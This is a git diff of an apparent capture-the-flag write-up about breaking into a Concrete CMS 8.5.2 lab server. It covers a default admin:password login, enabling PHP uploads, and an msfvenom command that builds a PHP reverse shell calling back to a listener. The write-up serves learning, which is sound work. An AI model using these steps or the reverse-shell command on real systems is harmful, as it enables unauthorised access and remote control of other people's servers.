@@ -17,7 +17,7 @@ Gobuster directory enumeration shows /app directory, which eventually leads me t
 ![image](https://github.com/user-attachments/assets/5b5eae1c-9472-4d91-8070-0edacb0a1249)<br />
 As you can see from the image above, Wappalyzer shows that this server is running `Concrete CMS 8.5.2`. After some online search and website enumeration, I found the following page `http://10.10.137.9:85/app/castle/index.php/login`:<br />
 ![image](https://github.com/user-attachments/assets/994cb771-e08d-42af-9f77-93b6ce5159ef)<br />
-I tried with `admin:password`, and it worked, lol. Now I can exploit a vulnerability that i found [here](https://hackerone.com/reports/768322). Follow the steps provided in this guide:<br />
+I saw online that the default username for the admin is `admin.` So I tried with `admin:password`, and it worked, lol. Now I can exploit a vulnerability that i found [here](https://hackerone.com/reports/768322). Follow the steps provided in this guide:<br />
 Add .php in the allowed file types: <br />
 ![image](https://github.com/user-attachments/assets/76e8c642-45ab-4bfe-96d1-62cfbf2efb84)<br />
 Now generate a php revershe shell with msfvenom: `msfvenom -p php/reverse_php LHOST=192.168.1.1 LPORT=1234 > shell.php`.<br />
